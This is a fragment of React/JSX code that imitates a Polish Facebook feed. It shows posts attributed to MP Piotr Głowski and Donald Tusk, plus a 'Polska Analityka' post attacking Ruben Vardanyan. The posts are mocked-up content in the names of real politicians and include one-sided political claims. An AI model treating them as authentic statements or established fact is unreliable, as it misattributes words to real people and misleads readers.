            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
            </svg>
            Polub
          </button>
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
            </svg>
            Skomentuj
          </button>
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z" />
            </svg>
            Udostępnij
          </button>
        </div>
      </div>
    </div>










            <div className="bg-white rounded-lg shadow mb-4 w-full">
      {/* Post Header */}
      <div className="p-4 pb-2">
        <div className="flex items-start">
          <div className="w-10 h-10 rounded-full mr-2 overflow-hidden bg-blue-100 flex items-center justify-center">
            <img 
              src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" 
              alt="Piotr Głowski" 
              className="w-full h-full object-cover" 
            />
          </div>
          <div className="flex-grow">
            <div className="flex justify-between items-start w-full">
              <div>
                <div className="flex items-center">
                  <h3 className="font-semibold">Poseł Piotr Głowski</h3>
                  <span className="ml-1 text-gray-500 text-sm">jest w:</span>
                </div>
                <div className="font-semibold">Regionalne Centrum Kultury w Pile.</div>
                <div className="flex items-center text-xs text-gray-500">
                  <span>1d</span>
                  <span className="mx-1">·</span>
                  <span>Piła, województwo wielkopolskie</span>
                  <span className="mx-1">·</span>
                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm0 14.5a6.5 6.5 0 1 1 0-13 6.5 6.5 0 0 1 0 13z"/>
                  </svg>
                </div>
              </div>
              <div className="relative">
                <button 
                  className="text-gray-500 ml-2 p-1 rounded-full hover:bg-gray-100"
                  onClick={() => setShowMenu(!showMenu)}
                >
                  <svg viewBox="0 0 20 20" width="20" height="20" fill="currentColor">
                    <g fillRule="evenodd" transform="translate(-446 -350)">
                      <path d="M458 360a2 2 0 1 1-4 0 2 2 0 0 1 4 0m6 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0m-12 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0"></path>
                    </g>
                  </svg>
                </button>
                {showMenu && (
                  <div className="absolute right-0 mt-1 w-48 bg-white rounded-md shadow-lg z-10">
                    <ul className="py-1">
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zapisz post
                        </a>
                      </li>
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zgłoś
                        </a>
                      </li>
                    </ul>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
      
      {/* Post Content */}
      <div className="px-4 pb-2">
        <p className="mb-2">
          CZERWONE GITARY świętują 60. lecie. Są trochę starsi ode mnie.
          <span role="img" aria-label="crying laughing" className="ml-1">😢</span>
          <span role="img" aria-label="laughing" className="ml-1">😂</span>
          <br/>
          Tylko trochę 
          <span role="img" aria-label="smiling face" className="ml-1">😊</span>
          <span role="img" aria-label="smiling face" className="ml-1">😊</span>
          <span role="img" aria-label="smiling face" className="ml-1">😊</span>
        </p>
      </div>
      
      {/* Post Image */}
      <div className="px-4">
        <div className="rounded-lg overflow-hidden">
          <img 
            src="/Assets/Gwarancja.rozwoju/photo_post_1.jpg" 
            alt="Czerwone Gitary concert" 
            className="w-full h-full object-cover" 
          />
        </div>
      </div>
      
      {/* Post engagement stats */}
      <div className="flex justify-between text-xs text-gray-500 border-b border-t py-2 px-4 mx-4 my-2">
        <div className="flex items-center">
          <div className="flex -space-x-1 mr-1">
            <div className="bg-blue-500 rounded-full w-5 h-5 flex items-center justify-center">
              <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
              </svg>
            </div>
            <div className="bg-red-500 rounded-full w-5 h-5 flex items-center justify-center">
              <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
              </svg>
            </div>
          </div>
          <span>6</span>
        </div>
        <div>
          <span>1 udostępnienie</span>
        </div>
      </div>
      
      {/* Action buttons */}
      {isMobile ? (
        // Mobile action buttons (3 buttons)
        <div className="flex px-4">
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
            </svg>
            Polub
          </button>
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
            </svg>
            Komentarz
          </button>
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z" />
            </svg>
            Udostępnij
          </button>
        </div>
      ) : (
        // Desktop action buttons (only 2 buttons)
        <div className="flex px-4 pb-2">
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
            </svg>
            Polub
          </button>
          <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
            <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
              <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
            </svg>
            Skomentuj
          </button>
        </div>
      )}
    </div>




    <div className="bg-white rounded-lg shadow mb-4 w-full">
      <div className="p-4">
        {/* Header with user info */}
        <div className="flex items-start mb-3">
          <div className="w-10 h-10 rounded-full mr-2 overflow-hidden bg-blue-100 flex items-center justify-center">
            <img 
              src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" 
              alt="User" 
              className="w-full h-full object-cover" 
            />
          </div>
          <div className="flex-grow">
            <div className="flex justify-between items-start w-full">
              <div>
                <div className="flex items-center">
                  <h3 className="font-semibold">Polska Analityka</h3>
                </div>
                <div className="flex items-center text-xs text-gray-500">
                  <span>1d</span>
                  <span className="mx-1">·</span>
                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm0 14.5a6.5 6.5 0 1 1 0-13 6.5 6.5 0 0 1 0 13z"/>
                  </svg>
                </div>
              </div>
              <div className="relative">
                <button 
                  className="text-gray-500 ml-2 p-1 rounded-full hover:bg-gray-100"
                  onClick={() => setShowMenu(!showMenu)}
                >
                  <svg viewBox="0 0 20 20" width="20" height="20" fill="currentColor">
                    <g fillRule="evenodd" transform="translate(-446 -350)">
                      <path d="M458 360a2 2 0 1 1-4 0 2 2 0 0 1 4 0m6 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0m-12 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0"></path>
                    </g>
                  </svg>
                </button>
                {showMenu && (
                  <div className="absolute right-0 mt-1 w-48 bg-white rounded-md shadow-lg z-10">
                    <ul className="py-1">
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zapisz post
                        </a>
                      </li>
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zgłoś
                        </a>
                      </li>
                    </ul>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
        
        {/* Post content - text and image */}
        <div className="mb-3 overflow-hidden">
          <div className="mb-3">
            <p className="mb-3 break-words">
              Oligarcha Putina przed sądem: czy Europa powinna nadal walczyć z planami Kremla?
            </p>
            <p className="mb-3 break-words">
              W Baku w Azerbejdżanie rozpoczął się proces putinowskiego oligarchy Rubena Vardaniana. Do 2022 r. był on jednym z głównych instrumentów finansowych Rosji, piorąc pieniądze dla kremlowskiej nomenklatury i sponsorując rosyjską agresję. Ten oligarcha, znany jako "portfel Putina", nie tylko prał pieniądze, aby wspierać rosyjską elitę, ale także kierował nielegalnym rządem w Karabachu. Znajduje się na listach sankcyjnych UE, USA i Ukrainy.
            </p>
            
            {expanded ? (
              <>
                <p className="mb-3 break-words">
                  Co więcej, Kreml próbował legitymizować jego przestępczą działalność, nominując go do Pokojowej Nagrody Nobla. Nominacja ta spotkała się jednak z ostrym potępieniem: ponad 120 parlamentarzystów z różnych krajów podpisało wspólny apel domagający się anulowania nominacji. Dali jasno do zrozumienia, że człowiek, który finansował agresję i wspierał separatyzm, nie zasługuje na najwyższe międzynarodowe uznanie.
                </p>
                <p className="mb-3 break-words">
                  Jaka jest rola Polski w tej sytuacji? Jesteśmy wśród tych, którzy sprzeciwiają się putinizacji Europy, rozprzestrzenianiu się rosyjskich wpływów i praniu brudnych pieniędzy.
                </p>
                <p className="mb-3 break-words">
                  Jaka jest rola Polski w tej sytuacji? Jesteśmy jednym z tych, którzy sprzeciwiają się putinizacji Europy, rozprzestrzenianiu się rosyjskich wpływów i praniu brudnych pieniędzy.
                </p>
                <p className="mb-3 break-words">
                  Proces Vardanyana to tylko jeden krok. Musimy nadal wywierać presję na tych, którzy czerpią korzyści z rosyjskiej agresji, którzy próbują promować lobbowane interesy Moskwy w Europie.
                </p>
                <p className="mb-3 break-words">
                  Sprawiedliwość musi zwyciężyć! Polska musi nadal być głosem w obronie demokracji i uczciwej polityki!
                </p>
                <button 
                  onClick={() => setExpanded(false)} 
                  className="text-blue-500 font-medium hover:underline"
                >
                  Pokaż mniej
                </button>
              </>
            ) : (
              <>
                <p className="mb-3 break-words">
                  Co więcej, Kreml próbował legitymizować jego przestępczą działalność, nominując go do Pokojowej Nagrody Nobla. Nominacja ta spotkała się jednak z ostrym potępieniem: ponad 120 parlamentarzystów z różnych krajów podpisało wspólny apel domagający się anulowania nominacji...
                </p>
                <button 
                  onClick={() => setExpanded(true)} 
                  className="text-blue-500 font-medium hover:underline"
                >
                  Wyświetl więcej
                </button>
              </>
            )}
          </div>
        </div>
        
        {/* Post engagement stats */}
        <div className="flex justify-between text-xs text-gray-500 border-b py-2 mb-2">
          <div className="flex items-center">
            <div className="flex -space-x-1 mr-1">
              <div className="bg-blue-500 rounded-full w-5 h-5 flex items-center justify-center">
                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
                </svg>
              </div>
              <div className="bg-red-500 rounded-full w-5 h-5 flex items-center justify-center">
                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
                </svg>
              </div>
            </div>
            <span>28</span>
          </div>
          <div>
            <span>14 komentarzy · 4 udostępnień</span>
          </div>
        </div>
        
        {/* Action buttons */}
        {isMobile ? (
          // Mobile action buttons (3 buttons)
          <div className="flex">
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
              </svg>
              Polub
            </button>
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
              </svg>
              Komentarz
            </button>
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z" />
              </svg>
              Udostępnij
            </button>
          </div>
        ) : (
          // Desktop action buttons (only 2 buttons)
          <div className="flex">
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
              </svg>
              Polub
            </button>
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
              </svg>
              Skomentuj
            </button>
          </div>
        )}
      </div>
    </div>
    
    



    <div className="bg-white rounded-lg shadow mb-4 w-full">
      <div className="p-4">
        {/* Header with user info */}
        <div className="flex items-start mb-3">
          <div className="w-10 h-10 rounded-full mr-2 overflow-hidden bg-blue-100 flex items-center justify-center">
            <img 
              src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" 
              alt="User" 
              className="w-full h-full object-cover" 
            />
          </div>
          <div className="flex-grow">
            <div className="flex justify-between items-start w-full">
              <div>
                <div className="flex items-center">
                  <h3 className="font-semibold">Poseł Piotr Głowski</h3>
                </div>
                <div className="flex items-center text-xs text-gray-500">
                  <span>1d</span>
                  <span className="mx-1">·</span>
                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm0 14.5a6.5 6.5 0 1 1 0-13 6.5 6.5 0 0 1 0 13z"/>
                  </svg>
                </div>
              </div>
              <div className="relative">
                <button 
                  className="text-gray-500 ml-2 p-1 rounded-full hover:bg-gray-100"
                  onClick={() => setShowMenu(!showMenu)}
                >
                  <svg viewBox="0 0 20 20" width="20" height="20" fill="currentColor">
                    <g fillRule="evenodd" transform="translate(-446 -350)">
                      <path d="M458 360a2 2 0 1 1-4 0 2 2 0 0 1 4 0m6 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0m-12 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0"></path>
                    </g>
                  </svg>
                </button>
                {showMenu && (
                  <div className="absolute right-0 mt-1 w-48 bg-white rounded-md shadow-lg z-10">
                    <ul className="py-1">
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zapisz post
                        </a>
                      </li>
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zgłoś
                        </a>
                      </li>
                    </ul>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
        
        {/* Post content - text and image */}
        <div className="mb-3 overflow-hidden">
          <div className="mb-3">
            <p className="mb-2 break-words">
              <span role="img" aria-label="pointing hand">👆</span>
              <span role="img" aria-label="pointing hand">👆</span>
              <span role="img" aria-label="pointing hand">👆</span>
              Powiat Czarnkowsko-Trzciancki - Rozbudowa drogi Trzcianka - Biała
            </p>
            <p className="mb-2 break-words">
              Kolejną inwestycją z Rządowego Funduszu Rozwoju Dróg jest rozbudowa drogi powiatowej Trzcianka – Biała. <span className="text-blue-600">Powiat Czarnkowsko-Trzciancki</span> otrzymał dofinansowanie w wysokości 13,5 mln zł. Prace mają na celu poprawę infrastruktury drogowej na tym odcinku, co znacząco poprawi dostępność i bezpieczeństwo tej trasy.
            </p>
            <p className="mb-2 break-words">
              Projekt ten ma kluczowe znaczenie dla całego regionu, jako że zwiększy mobilność mieszkańców oraz poprawi komunikację między Trzcianką a Białą. Dzięki tej inwestycji kierowcy zyskają nie tylko bezpieczniejszą drogę, ale także komfort podróży.
            </p>
            <p className="text-blue-600">
              <a href="#" className="hover:underline">#PosełPiotrGłowski</a>
            </p>
          </div>
          <div className="rounded-lg overflow-hidden">
            <img 
              src="/Assets/Gwarancja.rozwoju/photo_post_2.jpg" 
              alt="Road development announcement with Piotr Głowski" 
              className="w-full h-full object-cover" 
            />
          </div>
        </div>
        
        {/* Post engagement stats */}
        <div className="flex justify-between text-xs text-gray-500 border-b py-2 mb-2">
          <div className="flex items-center">
            <div className="flex -space-x-1 mr-1">
              <div className="bg-blue-500 rounded-full w-5 h-5 flex items-center justify-center">
                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
                </svg>
              </div>
              <div className="bg-red-500 rounded-full w-5 h-5 flex items-center justify-center">
                <svg className="w-3 h-3 text-white" fill="currentColor" viewBox="0 0 24 24">
                  <path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z" />
                </svg>
              </div>
            </div>
            <span>143</span>
          </div>
          <div>
            <span>27 komentarzy · 48 udostępnień</span>
          </div>
        </div>
        
        {/* Action buttons */}
        {isMobile ? (
          // Mobile action buttons (3 buttons)
          <div className="flex">
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
              </svg>
              Polub
            </button>
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
              </svg>
              Komentarz
            </button>
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92s-1.31-2.92-2.92-2.92z" />
              </svg>
              Udostępnij
            </button>
          </div>
        ) : (
          // Desktop action buttons (only 2 buttons)
          <div className="flex">
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M1 21h4V9H1v12zm22-11c0-1.1-.9-2-2-2h-6.31l.95-4.57.03-.32c0-.41-.17-.79-.44-1.06L14.17 1 7.59 7.59C7.22 7.95 7 8.45 7 9v10c0 1.1.9 2 2 2h9c.83 0 1.54-.5 1.84-1.22l3.02-7.05c.09-.23.14-.47.14-.73v-1.91l-.01-.01L23 10z" />
              </svg>
              Polub
            </button>
            <button onClick={openModal} className="flex-1 py-1 text-gray-500 font-medium text-sm flex items-center justify-center hover:bg-gray-100 rounded">
              <svg className="w-5 h-5 mr-1" fill="currentColor" viewBox="0 0 24 24">
                <path d="M21.99 4c0-1.1-.89-2-1.99-2H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h14l4 4-.01-18z" />
              </svg>
              Skomentuj
            </button>
          </div>
        )}
      </div>
    </div>






    

    <div className="bg-white rounded-lg shadow mb-4 w-full">
      {/* Original poster header */}
      <div className="p-4 pb-2">
        <div className="flex items-start">
          <img 
            src="/Assets/Gwarancja.rozwoju/photo_avatar.jpg" 
            alt="Piotr Głowski" 
            className="w-10 h-10 rounded-full mr-2" 
          />
          <div className="flex-grow">
            <div className="flex justify-between items-start w-full">
              <div>
                <div className="flex items-center">
                  <h3 className="font-semibold">Poseł Piotr Głowski</h3>
                </div>
                <div className="flex items-center text-xs text-gray-500">
                  <span>2 d</span>
                  <span className="mx-1">·</span>
                  <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 16 16">
                    <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm0 14.5a6.5 6.5 0 1 1 0-13 6.5 6.5 0 0 1 0 13z"/>
                  </svg>
                </div>
              </div>
              <div className="relative">
                <button 
                  className="text-gray-500 ml-2 p-1 rounded-full hover:bg-gray-100"
                  onClick={(e) => {
                    e.stopPropagation();
                    setShowMenu(!showMenu);
                  }}
                >
                  <svg viewBox="0 0 20 20" width="20" height="20" fill="currentColor">
                    <g fillRule="evenodd" transform="translate(-446 -350)">
                      <path d="M458 360a2 2 0 1 1-4 0 2 2 0 0 1 4 0m6 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0m-12 0a2 2 0 1 1-4 0 2 2 0 0 1 4 0"></path>
                    </g>
                  </svg>
                </button>
                {showMenu && (
                  <div className="absolute right-0 mt-1 w-48 bg-white rounded-md shadow-lg z-10">
                    <ul className="py-1">
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zapisz post
                        </a>
                      </li>
                      <li>
                        <a href="#" className="block px-4 py-2 text-sm text-gray-700 hover:bg-gray-100">
                          Zgłoś
                        </a>
                      </li>
                    </ul>
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </div>
      
      {/* Shared post container */}
      <div className="mx-4 mb-4 rounded-lg border border-gray-200 overflow-hidden">
        {/* Shared post header */}
        <div className="p-4">
          <div className="flex items-start">
            <div className="w-10 h-10 rounded-full mr-2 overflow-hidden bg-blue-100 border-2 border-blue-500">
              <img 
                src="/Assets/Gwarancja.rozwoju/dnldTuskCom.jpg" 
                alt="Donald Tusk" 
                className="w-full h-full object-cover" 
              />
            </div>
            <div className="flex-grow">
              <div className="flex items-center">
                <h3 className="font-semibold">Donald Tusk</h3>
                <svg viewBox="0 0 12 13" width="16" height="16" title="Zweryfikowane konto" className="ml-1 flex-shrink-0 fill-[#1877F2]">
                  <title>Zweryfikowane konto</title>
                  <g fillRule="evenodd" transform="translate(-98 -917)">
                    <path d="m106.853 922.354-3.5 3.5a.499.499 0 0 1-.706 0l-1.5-1.5a.5.5 0 1 1 .706-.708l1.147 1.147 3.147-3.147a.5.5 0 1 1 .706.708m3.078 2.295-.589-1.149.588-1.15a.633.633 0 0 0-.219-.82l-1.085-.7-.065-1.287a.627.627 0 0 0-.6-.603l-1.29-.066-.703-1.087a.636.636 0 0 0-.82-.217l-1.148.588-1.15-.588a.631.631 0 0 0-.82.22l-.701 1.085-1.289.065a.626.626 0 0 0-.6.6l-.066 1.29-1.088.702a.634.634 0 0 0-.216.82l.588 1.149-.588 1.15a.632.632 0 0 0 .219.819l1.085.701.065 1.286c.014.33.274.59.6.604l1.29.065.703 1.088c.177.27.53.362.82.216l1.148-.588 1.15.589a.629.629 0 0 0 .82-.22l.701-1.085 1.286-.064a.627.627 0 0 0 .604-.601l.065-1.29 1.088-.703a.633.633 0 0 0 .216-.819"></path>
                  </g>
                </svg>
              </div>
              <div className="flex items-center text-xs text-gray-500">
                <span>2 d</span>
                <span className="mx-1">·</span>
                <svg className="w-3 h-3" fill="currentColor" viewBox="0 0 16 16">
                  <path d="M8 0a8 8 0 1 0 0 16A8 8 0 0 0 8 0zm0 14.5a6.5 6.5 0 1 1 0-13 6.5 6.5 0 0 1 0 13z"/>
                </svg>
              </div>
            </div>
          </div>
          
          {/* Shared post content */}
          <div className="mt-3">
            {!expanded ? (
              <div>
                <p>Mieli do wyboru: poparcie uchwały albo hańbę. Wybrali hańbę, a uchwałę i tak przegłosowaliśmy. PiS i Konfederacja ponownie przeciw Tarczy Wschód i europejskiej ...</p>
                <button 
                  onClick={() => setExpanded(true)}
                  className="text-blue-600 font-medium text-sm mt-1"
